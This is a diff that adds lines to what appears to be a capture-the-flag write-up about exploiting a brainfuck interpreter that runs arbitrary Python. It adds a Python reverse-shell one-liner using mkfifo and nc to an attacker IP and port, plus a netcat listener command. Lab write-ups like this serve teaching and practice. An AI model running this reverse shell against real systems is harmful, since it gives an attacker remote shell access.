@@ -63,8 +63,20 @@ for i in range(10):
     print(F(i))
 ``` 
 now it's obvious uhn; let's pop a reverse shell with this ``python-netcat mega-combo oneliner``
-:trollface:
+:trollface:   
+```python
+import os
+os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP> <PORT> >/tmp/f")
+```
+
 
 ## Exploitation
 ### Foothold: Initial access
+Since we know that the brainfuck interpreter would execute any python code(in brainfuck) that we put in it, we can convert the above python reverse shell to brainfuck and execute it.
+
+#### Listener: 
+Create a netcat lilstener, to listen for incoming connections and also give us a shell.  
+```bash
+nc -lvnp 4444
+```
 
